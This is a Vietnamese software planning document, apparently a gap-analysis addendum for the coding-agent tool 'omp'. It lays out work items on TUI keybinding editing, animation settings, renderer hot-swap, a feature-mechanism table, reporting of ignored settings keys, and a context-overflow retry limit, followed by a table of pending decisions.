**Là một overlay TUI mới nên thuộc M3 theo miền bề mặt. Nhưng KHÔNG gộp vào Sóng 1/2 của M3.** GAP-M3-B4 đang sửa `keybindings.ts` quanh `#rebuild()` và `getConflicts()`, và overlay mới **cần chính dữ liệu conflict đó** để cảnh báo ngay khi người dùng tạo ra xung đột mới.

**Cái omp thiếu — ba lệnh, một kết luận: phần DÒ thì có, phần HIỆN thì không.**
1. `TUI_KEYBINDINGS` → 4 hit: `keybindings.ts:58` định nghĩa profile mặc định nạp trong code, `keybindings.ts:348` dựng `KeybindingsManager(TUI_KEYBINDINGS)`, `app-keybindings.ts:18/:87` nhập và gộp.
2. `app-keybindings.ts:392` `const KEYBINDINGS_YML = "keybindings.yml"` và `:592-593` — nạp từ `agentDir/keybindings.yml`, có migrate `keybindings.json` cũ.
3. `ls packages/tui/src/overlays/ | grep -iE 'key|bind'` → **rỗng** (thư mục có **65** overlay). Và `grep -rn 'keybindings' packages/coding-agent/src/slash-commands/` chỉ trả về 2 import `formatKeyHint` (`builtin-collaboration.ts:3`, `builtin-modes.ts:3`) — tức chỉ dùng để **GHI NHÃN phím**, không có màn hình nào để **SỬA**.

**Phần omp ĐÃ có, và rất tốt:** `KeybindingsManager` với `canonicalKeyId` (`:190`) + `addKeyAliases` (`:222`) + `#conflicts` + `getConflicts()` (`:317`), và `docs/keybindings.md`.
**Thiếu đúng một thứ: bề mặt sửa.** Hôm nay muốn remap `app.interrupt` phải mở trình soạn, sửa YAML, khởi động lại.
**Khoảng cách: SỬA CHO KHỚP** — store, merge, phát hiện xung đột đã đủ; chỉ thiếu UI trên đúng cái store đó.

**Hình dạng port — không chép dòng nào.** Một overlay mới `packages/tui/src/overlays/keybinding-editor.ts`, dựng trên `SelectList` sẵn có (dùng lại, **không tạo bản thứ hai**) và trên `boundKeys`/`appKey` trong `chrome/keybinding-hints.ts`.
Luồng: chọn action → bấm phím → ghi vào `keybindings.yml` qua đường ghi có sẵn → rebuild → nếu `#conflicts` không rỗng thì hiện cảnh báo **NGAY tại chỗ**.

**Pháp lý:** chỉ mang ý tưởng.

**Cái được bảo toàn — bốn điều:**
1. **`#rebuild()` giữ nguyên** — thuật toán không sửa.
2. `canonicalKeyId` + `addKeyAliases` giữ nguyên. Bỏ chúng thì **số đếm xung đột sai**: một phím escape và một phím thật sẽ bị báo trùng giả — đúng cảnh báo GAP-M3-B4 đã viết.
3. `keybindings.yml` phải giữ nguyên định dạng và cơ chế migrate `keybindings.json`. `docs/keybindings.md` phải cập nhật.
4. **Overlay mới KHÔNG được tự ý thêm keybinding mới** — nó chỉ remap những action đã có.

**Về TUI sanitization:** overlay này là text đi ra TUI, nên **bắt buộc** đi qua `replaceTabs` / `truncateToWidth` / `shortenPath` / `PREVIEW_LIMITS` theo `AGENTS.md`. Và **phải có đường XOÁ một remap** (đặt về mặc định) — overlay chỉ thêm mà không xoá thì sau vài lần remap là không dùng được.

**Phụ thuộc — B4 phải merge trước, và lý do là kỹ thuật chứ không phải lịch sự.** B4 đưa `getConflicts()` ra khỏi phòng thí nghiệm bằng cách thêm một consumer cảnh báo lúc nạp; overlay này là **consumer thứ hai** và phải dùng **CÙNG một hàm format** để cảnh báo trùng nhìn giống nhau — nếu không, người dùng sẽ thấy **hai kiểu cảnh báo xung đột khác nhau ở hai nơi**, và cái sai là cái thứ hai.

---

## GAP-M3-B8 — Một công tắc mẹ cho animation, và một lần dò reduced-motion để tắt mặc định khi không chắc

**Nguồn:** `codex.112`
**Milestone:** M3 — cùng miền bề mặt TUI, **sau GAP-M3-B7**
**Effort:** S — dưới 0,5 ngày cho phần công tắc mẹ. Phần probe: **S nếu terminal có tín hiệu, và "không làm gì" nếu không có.**

**Cái omp thiếu — ba lệnh, và một đính chính quan trọng về khuôn.**
1. `grep -rniE 'screen.?reader|screenReader|reduced.?motion|prefers-reduced' packages/tui/src` → **đúng 1 hit**, và nó là **một CÂU CHÚ THÍCH**: `chat/assistant-message.ts:507` (*"text label keeps the pulse descriptive for terminals and screen readers"*). Không có probe nào.
2. `grep -rniE 'animations|enableSpinner|reduceMotion|disableAnimation' packages/coding-agent/src packages/tui/src` → 3 hit, cả ba đều **cục bộ**: `tool-execution.ts:180` (*"stop its animations"* — một lệnh dừng của một component), `shimmer.ts:163`, và một dòng trong `THIRD-PARTY-NOTICES.txt`.
3. `grep -oE '"tui\.[a-zA-Z.]+"' packages/coding-agent/src/config/all-settings.ts` → **rỗng**. Không có nhóm setting `tui.*` làm công tắc mẹ.

> **Đính chính so với claim đầu vào.** Đề xuất gốc nói *"dùng `OnceLock` — `git grep OnceLock -- packages/tui/src` cho thấy khuôn đã có"*. **Đo lại: `OnceLock` → 0 hit trong `packages/tui/src`.** Toàn repo chỉ có 2 chú thích (`packages/ai/src/providers/openai-codex-responses.ts:552`, `packages/natives/native/index.d.ts:666`), cả hai đều mô tả codex-Rust chứ không phải khuôn dùng lại được. **Probe phải viết mới; không có `OnceLock` để tái dùng.**

**Phần omp ĐÃ có, nhiều hơn codex ở đúng tầng này:** `ShimmerMode = "classic" | "kitt" | "disabled"` (`shimmer.ts:31`) đã được nối thật vào một setting qua `effect(cfgDisplayShimmer, setShimmerMode)` (`modes/settings.ts:547`), và `isShimmerAnimationsActive()` trả false đúng khi disabled.
**Thiếu:** trục thứ hai tắt toàn bộ hiệu ứng cùng lúc, và mặc định *"chưa chắc thì không động"*.
**Khoảng cách: LÀM MỚI ở tầng quyết định, sửa cho khớp ở tầng setting.**

**Hình dạng port — không chép dòng nào.** Hai việc tách bạch, và **phải nói rõ phần thứ hai KHÔNG chắc chắn làm được**:
1. Setting mẹ `tui.animations` với `on | off | auto`, đặt cạnh `cfgDisplayShimmer`. `off` phải tắt **mọi** hiệu ứng chứ không chỉ shimmer — nghĩa là phải đi qua **một seam chung** thay vì set từng component. Đây là phần chắc chắn làm được.
2. Một probe chạy **đúng một lần** rồi nhớ, trả về **một giá trị có tên** chứ không phải boolean, để khi không xác định được thì hệ thống **im lặng** thay vì giả định có. Đây là phần **phụ thuộc terminal có hỗ trợ hay không** — phải chốt trước khi viết dòng nào.

**Pháp lý:** chỉ mang ý tưởng. Nguyên tắc *"unknown ⇒ im lặng"* là phán quyết chung, lấy từ opencode (bảng quyết định M6 hàng 5) chứ không phải từ codex.

**Cái được bảo toàn — hai điều:**
1. `setShimmerMode` và `cfgDisplayShimmer` giữ nguyên: công tắc mẹ là **LỚP TRÊN, không phải lớp thay**. Nhánh `disabled` của `shimmer.ts` phải **tiếp tục render mọi tier bằng màu thấp** chứ không được biến thành render rỗng — tắt animation không được đồng nghĩa mất thông tin.
2. `tui.animations` mới **phải đi qua `assertKnownSettingPaths`** như mọi setting khác, nếu không sẽ không chặn được typo path.

**Nói thẳng trong PR, không bán như một đảm bảo:** trên terminal thường **KHÔNG có tín hiệu screen reader đáng tin**. Vì vậy `auto` phải mặc định là **bật**, và probe chỉ là **tối ưu cho thiết bị có terminal hỗ trợ**. Đây là tính năng trợ năng ở mức *best-effort*; ghi nó là accessibility guarantee là một lời hứa giả thứ hai trong cùng một chương trình.

---

## GAP-M3-B9 — Hot-swap hai renderer: scrollback tự cuộn ↔ viewport cố định có dock

**Nguồn:** `pi.87`
**Milestone:** M3 — **sau M1 W15**
**Effort:** M — khoảng 1,5 ngày nếu giới hạn ở hot-swap state + một preset dock; **L** nếu thêm horizontal pan
**Phụ thuộc CỨNG:** M1 W15 (transcript search, wave 7) — đó là nơi `TranscriptBrowser` sinh ra. **Renderer thứ hai tồn tại thì mới có cái để swap.**

**M3 là milestone bề mặt người dùng, và đây là thay đổi bề mặt thuần tuý** — không có thay đổi nào khác của TUI.

**Cái omp thiếu.** omp chỉ dùng alt-screen cho **HAI** việc: repaint tạm khi resize (`tui.ts:1497` `setAltScreenActive(true)`, đóng ở `:1547`) và các app fullscreen dựng lại. **Không có khái niệc chọn renderer ở mức ứng dụng.**

`grep -rniE 'scrollback|fixedDock|dockViewport|hotSwapRenderer|swapRenderer'` chỉ trả về các khái niệm về **native terminal scrollback** (`tui.ts:128,132,185,305,314` — `ResizeScrollbackMode = "append" | "rebuild" | "preserve"`), **không phải hai renderer của app**.

**Hình dạng port — THIẾT KẾ LẠI trên nền W15, không chép từ `pi`.** Cấu trúc state/render của `pi` phụ thuộc layout model mà omp **không có**. Phần sử dụng được là `ChatTranscriptBuilder` + `TranscriptBrowser` mà W15 đã mang vào.

**Pháp lý:** thiết kế mới. Không chép file renderer nào của `pi`.

**Cái được bảo toàn — hai điều, một điều là an toàn dữ liệu:**
1. **Phải giữ `ResizeScrollbackMode` ba nhánh và `clearScrollback`** — đó là **hợp đồng với native terminal scrollback** mà người dùng cuộn lại được. Hot-swap renderer không được chặn scrollback của chính terminal.
2. **Phải có escape hatch.** Nếu chết ở chế độ dock thì người dùng **mất transcript** — tệ hơn nhiều so với bình thường, vì nó xảy ra đúng lúc người dùng đang cần đọc lại.

**Ghi chú xung đột phải nói trước:** mục này **chạm `terminal.ts`**, cùng vùng với GAP-M3-B6. Hai mục phải có **thứ tự merge rõ ràng** — B6 đổi mô hình alt-screen, B9 thêm renderer thứ hai. Nếu gộp, một lỗi ở đây làm đỏ cả hai cùng lúc và không tách được.

---

# M4 — hai mục mới

## GAP-M4-14 — Bảng feature → cơ chế: mỗi hành vi người dùng thấy phải trỏ tới đúng một file và đúng một cổng kiểm

**Nguồn:** `dsh.68`
**Milestone:** M4 Wave D — cùng đợt M4-9
**Effort:** S–M. **Rẻ hơn hẳn M4-DISCIPLINE-3** vì không phải đọc repo khác.

**Cùng sóng với M4-9 vì cùng một hình dạng PR:** một lệnh chỉ-đọc, không sửa hành vi, không thêm seam. Wave D đã mang `shippable: false` và một quyết định changelog chung, nên thêm một hàng bảng văn xuôi ở đây **không kéo theo quyết định release mới**.

**Quan trọng hơn: M4 là milestone cuối của chương trình.** Một bảng trả lời *"cơ chế nào làm hành vi này thật"* chỉ có giá trị khi đứng **sau** M1/M2/M3 đã đóng; đặt sớm thì nó **mô tả một thế giới chưa tồn tại** — đúng cái lý do M6 hàng 16 đã nêu cho GAP-M6-16.

**Cái omp thiếu — đo được.** omp có tài liệu rất đầy đủ nhưng tổ chức **THEO SUBSYSTEM** (60+ file trong `docs/`, 36 file `docs/tools/<name>.md`), và **không có artifact nào trả lời câu hỏi ngược lại**:
- `grep -rniE 'proof obligation|traceability|feature.*matrix|feature map' docs/` → **1 hit không liên quan** (`plugin-manager-installer-plumbing.md:108` nói về feature map của chính installer đó).
- `grep -rniE 'bảng (feature|tính năng)|feature (map|table|inventory)|mechanism' MILESTONE_*.md` → **không mục nào**.

Đây đúng là câu hỏi M4 tự đặt cho mình (*"thao tác này có thật sự xảy ra không?"*) nhưng không có chỗ nào ghi câu trả lời.

**Hình dạng port — không chép file nào.** Một bảng markdown `docs/feature-mechanism.md`, ba cột: `feature` (hành vi người dùng thấy) | `mechanism` (**đường đẳng cả hai đường thật, không phải tên package**) | `proof` (tên cổng kiểm đỏ được, hoặc chữ `none` + lý do).

**Bắt đầu từ CHÍNH bốn mục M4** vì chúng là bốn hàng mà milestone này tự tuyên bố — đó là **bằng chứng khả thi trước khi mở rộng**.

**Điều khoản bắt buộc để bảng không thành nghi thức:** hàng `proof: none` phải kèm lý do, và **số hàng `none` là một con số được đăng ký trong kế hoạch chứ không được để tăng vô hạn** — vì một bảng toàn `none` thì **tệ hơn không có bảng**. Đó là cách một sổ kỷ luật chết.

**Nhánh phủ định bắt buộc:** một hàng trỏ tới một file **đã bị xoá** thì bảng đỏ. Đó là hợp đồng quan sát được, và nó là thứ khiến bảng đáng tin hơn một danh sách ước muốn.

**Pháp lý:** chỉ mang ý tưởng. Quy tắc *"mỗi hàng tự đặt nghĩa vụ chứng minh"* là thiết kế của `dsh` (MIT); bảng và đường dẫn viết mới, **không chép dòng nào**.

**GẦN NHẤT ĐÃ CÓ:** GAP-M6-16 (giải phẫu khung TUI) — một subsystem cụ thể, ghi rõ *"không sửa dòng code nào"*. Khác chủ đề, không gộp.

**Cái được bảo toàn — một điều quan trọng hơn hình thức:** **60+ file `docs/` hiện có KHÔNG được gộp lại.** Không sửa bất kỳ file `.ts` nào. Và nếu phát hiện tài liệu **sai** so với cơ chế: **sửa TÀI LIỆU, không sửa bảng để khớp** — ngược hẳn với GAP-M4-10, ở đó bảng **sinh từ diff** nên bảng là chuẩn.

**Phụ thuộc:** không chặn ai. Nên làm **sau M4-DISCIPLINE-3** vì họ cùng nói về chứng minh — nhưng DISCIPLINE-3 là về *quyết định* còn bảng này là về *hành vi*. Làm trước sẽ tạo **hai nguồn sự thật cạnh nhau**, đúng thứ M4 cấm.

---

## GAP-M4-15 — File cấu hình của nhà khác bị đọc một nửa: `hooks` trong `.claude/settings.json` biến mất không một lời

**Nguồn:** `dsh.4` (phần còn thiếu)
**Milestone:** M4 Wave D — cùng đợt M4-9, không chặn ai
**Effort:** S — một hàm thuần + một dòng doctor. **Không chạm đường chạy hook nào**, nên không có bất biến hành vi nào phải bảo toàn ngoài ba điều dưới.

**M4-9 đã mở đúng đường `cli-commands.ts` cho một lệnh chỉ-đọc**, và bảng cổng của nó đã tự ghi nhận một điểm mù không test nào bắt được (lệnh có thật sự được đăng ký hay không). Thêm **một báo cáo chỉ-đọc thứ hai ở CÙNG sóng** biến điểm mù đó thành **hai điểm mù cùng một nguyên nhân**.

M4 cũng là nơi duy nhất trong chương trình đã đặt luật **"không dựng nguồn sự thật thứ hai"** thành điều kiện cổng — và mục này đúng là trường hợp của nó.

**Cái omp thiếu — và nó tệ hơn "im lặng".** omp đăng ký `.claude/settings.json` là **một LỚP CẤU HÌNH THẬT** (`config/settings.ts:1020` → `addFile(path.join(projectCwd, ".claude", "settings.json"))`), nên **mọi key omp biết trong file đó đều có hiệu lực**. Nhưng `hooks` thì không:
- `discovery/claude.ts:377` `loadHooks()` chỉ đọc **THƯ MỤC** `hooks/pre/` và `hooks/post/`, không đọc key `hooks` trong file settings.
- `grep '"hooks"'` trên `discovery/claude.ts` + `config/settings.ts` → **không có hit nào là consumer**.
- **Tệ hơn im lặng:** `assertKnownSettingPaths` (`settings.ts:225`) **CHỈ được gọi từ `#overrideLayer` (dòng 632)** — lớp `--config` của constructor, **không phải lớp file**. Nên một `hooks` hợp lệ trong `.claude/settings.json` **không ném lỗi mà bị bỏ qua im lặng**.

Đây đúng là hình dạng vi phạm mà M4 đặt tên: **hệ thống trông như đã cấu hình, và không có gì thay đổi.**

**Hình dạng port — không chép gì, và đây là ranh giới quan trọng.** KHÔNG sửa `loadHooks`. `dsh.4` đòi bridge **cả** `hooks.json` lẫn dialect Codex, và việc đó là **một quyết định sản phẩm lớn hơn nhiều** — một hook của Claude Code có thể chặn tool theo cách omp không diễn giải được.

Sửa **đúng thứ nhỏ nhất mà vẫn đúng: báo cáo sự mất mát thay vì báo im lặng.** Ba việc, và ba việc này là **toàn bộ item**:
1. Một hàm thuần `droppedForeignKeys(file, knownSettingIds)` trả các key lạ đã bị **khởi đầu từ một file settings của nhà khác**.
2. Một dòng trong `omp doctor` (GAP-M1-18) in những key đó — *"file này có 3 key omp không hiểu, trong đó có `hooks`"*.
3. Chỉ khi key lạ đó **là** `hooks` thì dòng cảnh báo nói rõ omp chỉ đọc `hooks/pre/` và `hooks/post/`.

**Pháp lý:** chỉ mang ý tưởng. Không chép dòng nào từ `dsh`.

**Phụ thuộc — GAP-M1-18 là điều kiện tiên quyết tuyệt đối.** Đây là **chỗ duy nhất** để in ra, và GAP-M1-18 đã đóng danh sách check. Vì vậy phải thêm một hàng vào danh sách đó **TRƯỚC khi code**, và theo GAP-D4 **mọi check mới phải tự chứng minh bằng một test**.
**Thứ tự bắt buộc: GAP-M1-18 trước item này.**

**Cái được bảo toàn — ba điều, cả ba đều là "đừng sửa cái đang đúng":**
1. `loadHooks()` của `claude.ts` **giữ nguyên hoàn toàn** — thư mục `hooks/{pre,post}/` vẫn là đường chính.
2. `assertKnownSettingPaths` **phải TIẾP TỤC chỉ bảo vệ lớp override của constructor**, vì đó là chính sách đúng (typo guard). **Mở rộng nó ra lớp file sẽ phá mọi file cấu hình của nhà khác** — khách hàng của omp viết `.claude/settings.json` với key mà omp không biết, và đó là bình thường.
3. Kiểm kê phải chạy **SAU khi `projectLayerForMerge` đã lọc**, nếu không sẽ báo nhầm key đã bị chủ động loại.

---

# M7 — một mục mới

## GAP-M7-04 — Giới hạn một lần duy nhất cho vòng compact-and-retry khi context overflow

**Nguồn:** `pi.71`
**Milestone:** M7 — cùng GAP-M7-02, sóng 0b
**Effort:** S — khoảng 0,5 ngày. **Đây là mục nhỏ nhất trong toàn bộ phần bổ sung.**
**Thứ tự:** GAP-M7-02 trước — mềm, nhưng nên cùng PR.

**GAP-M7-02 xử lý biên compaction; mục này xử lý biên retry.** Cùng một sự cố — *một lượt bị hỏng vì context* — nhìn từ hai phía.

> **Cố ý KHÔNG gộp**, và lý do phải viết ra vì hai mục này rất dễ bị người đọc tự gộp: gộp sẽ tạo **một PR sửa nhiều file với hai cổng đỏ không liên quan**. Cùng sự cố, **khác biên** — và "cùng sự cố" là lý do dễ gộp, không phải lý do nên gộp.

**Cái omp thiếu — thiếu phần gốc, và hệ quả thì đo được.** Đã kiểm: `session/session-maintenance.ts:156` `INCOMPLETE_RECOVERY_MAX_RETRIES = 3`, `#incompleteRecoveryAttempts` ở `:550`, reset ở `:603`/`:2760`/`:3059`, cổng chặn ở `:3083-3084`.

**Nhưng nó chặn lượt KHÔNG HOÀN THÀNH, không chặn lượt hoàn thành nhưng context vỡ.** Không có cờ `_overflowRecoveryAttempted` chặn overflow retry **ĐÚNG MỘT LẦN**.

**Hệ quả quan sát được:** một phiên có context window hẹp sẽ **compact rồi lại overflow rồi lại compact**, mỗi vòng lại tốn **một lượt model đầy đủ**. Với một phiên dài trên model có context nhỏ, đây là một khoản chi phí lặp lại không ai nhìn thấy.

**Hình dạng port — LÀM MỚI rất nhỏ.** Một cờ boolean trên vòng retry của `session-maintenance.ts` cùng một hằng hạn, đặt cạnh `INCOMPLETE_RECOVERY_*` sẵn có.

**Pháp lý:** làm mới → không có nghĩa vụ copy.

**Cái được bảo toàn — hai điều, cả hai đều là chống im lặng:**
1. **Sau một lần retry thất bại thì phải BÁO, không phải im lặng dừng.** Mục đích của cờ là **dừng lặp**, không phải **dừng im lặng** — nếu không, nó biến một vòng lặp tốn kém thành một lỗi không ai hiểu.
2. **Cờ phải tính theo nguyên nhân overflow, không theo số lần** — một lượt hỏng vì lý do khác **không được dùng hết hạn mức của overflow**. Nếu gộp hai nguyên nhân vào một bộ đếm, thì một lỗi mạng sẽ âm thầm tắt cơ chế hồi phục context.

---

# 6. Work item cần người quyết — phần bổ sung

Bốn quyết định. Đánh số tiếp từ `GAP-D10` để không đụng `GAP-D1…D9` của phần cũ.

| # | Mục | Quyết định | Phương án |
| --- | --- | --- | --- |
| **GAP-D10** | GAP-M1B-4 | **`pico3` (25 file / 8.074 dòng) là copy hay là viết lại?** Và câu hỏi lớn hơn nhiều: **vòng đời extension của omp nằm ở `core/extensions/` hay ở `pico3/kinds/plugin.ts` + `pico3/hooks.ts`?** | **(a)** Chép nguyên khối, chấp nhận va chạm với `agent-loop.ts` (148 KB) và `compaction/`; **(b)** Chép có chọn lọc — scheduler + membranes + bounded, bỏ session/memory; **(c)** Không chép, chỉ đọc để rút bài học. **Khuyến nghị: trả lời câu vòng đời TRƯỚC, chọn (b) nếu pico3 thắng** — vì (a) là 8.074 dòng lạ vào package đã phân kỳ 100%, còn (b) lấy đúng ba thứ omp thật sự thiếu. Lưu ý: **câu trả lời có thể làm M1B §1 sai** — và sửa §1 là một việc, không phải hệ quả phụ. |
| **GAP-D11** | GAP-M3-B6 | **Chế độ inline có trở thành mặc định không?** | **(a)** Không, phải bật tay — giữ mặc định hiện tại, thay đổi hành bằng 0; **(b)** Có, đo được rồi hạ — thay đổi hành người dùng thấy, cần changelog entry và một kỳ theo dõi hồi quy. **Khuyến nghị (a)**: alt-screen là hợp đồng với mọi overlay fullscreen, đổi mặc định trước khi có dữ liệu là đánh cược. Ràng buộc: **dù chọn gì, `bun test packages/tui` phải xanh** — cổng đó hiện còn đỏ một phần (M6 §1411), nên item này không được tự nhận xong khi cổng còn đỏ. |
| **GAP-D12** | GAP-M2-13 | **Ai quyết định danh sách tài nguyên bị project-trust bao trùm, và có lật ngược tuyên bố đã phát hành không?** Chú thích `types.ts:548-561` nói project trust trùm `extensions, settings, skills, resources` — **rộng hơn phạm vi extension** mà M2 WI-0 đang viết ADR. | **(a)** Chỉ `extensions` — giữ phạm vi hẹp, đỡ đụng; **(b)** Đúng như chú thích (`extensions, settings, skills, prompts, themes, resources`) — khớp tài liệu, rộng hơn nhiều. **Phải chốt cùng WI-0, không chốt riêng** — vì WI-0 đang viết ADR mà nếu mục này chốt khác thì ADR viết lại lần hai. Và bất kể chọn gì, **`CHANGELOG.md:1057` là mục đã phát hành nói omp không chặn** → cần changelog entry, không thể là thay đổi im lặng. |
| **GAP-D13** | GAP-M1B-1 | **Baseline ngân sách entry-graph chụp lúc nào?** | **(a)** Ở HEAD hôm nay — cổng đỏ ngay lần chạy đầu, mất ý nghĩa; **(b)** Sau khi M1 merge **và** sau sóng port đầu tiên — đúng nhưng trì hoãn; **(c)** Chụp ở HEAD **và** đánh dấu là `provisional`, chỉnh ngưỡng khi port xong. **Khuyến nghị (c)**: có cổng đỏ sớm hơn bằng chứng là tốt hơn không có cổng, **với điều kiện bắt buộc** — baseline provisional phải **ghi rõ là provisional trong chính file**, và `dev:timing` phải vẫn chạy được để lấy số cho lần chụp kế tiếp. |

---

# 7. Những gì phần bổ sung này nói thẳng

1. **Hai mục này có tỉ lệ giá trị/công sức cao nhất trong cả sổ, và cả hai đều nhỏ:** GAP-M1B-1 (cổng đo, ~0,5 ngày) và GAP-M1-21 (harden tiền-main, ~0,5 ngày). Nếu chỉ làm hai việc trong đợt này, làm hai cái đó. Khác ở chỗ: M1B-1 phải chờ M1B mở, còn M1-21 thì không chặn gì.
2. **Hai mục là lỗ hổng, không phải cải tiến:** GAP-M1-22 là hỗ trợ vận hành (không phải lỗ hổng), nhưng **GAP-M4-15 là hình dạng lỗ hổng tin cấu hình** — người dùng tưởng mình đã cấu hình hook, và không có gì báo. Nó cũng là mục **rẻ nhất** trong nhóm M4. Đổi thứ tự ưu tiên so với cảm giác ban đầu.
3. **Một mục là câu hỏi, không phải việc:** GAP-M1B-4. Nó giao một ngày để trả lời *"vòng đời extension của omp nằm ở đâu"*. Đó là tỉ lệ tốt nhất trong sổ, vì **câu trả lời sai sẽ làm một bảng quyết định đã viết phải viết lại** — và bảng quyết định viết lại tốn hơn nhiều so với một ngày đo.
4. **Đợt này bác 21 claim của chính audit.** Đó không phải lỗi của audit — đó là bằng chứng rằng **omp đã thành một công cụ có bản thành thụ hơn nhiều hình dạng mà các repo tham chiếu giữ**, và cũng là lý do tỉ lệ giữ lại dưới 20% là **tin tốt**, không phải tin xấu. Bài học vận hành: **đo trước, viết sau** — cả hai phần của sổ đều nên theo, và phần cũng nên được đo lại theo cách này khi có đợt tiếp.
5. **Ba điểm mù ở P1 không có chủ.** Chúng được đo được, không nằm trong danh sách đầu vào nên không thành work item, và **không nên thành work item** — nhưng chúng nên được đưa vào một đợt triage sau. Đặc biệt điểm thứ hai (`assertKnownSettingPaths` chỉ canh 1 trong 7 lớp) là loại bug **không ai thấy cho tới khi nó thành tai nạn**.
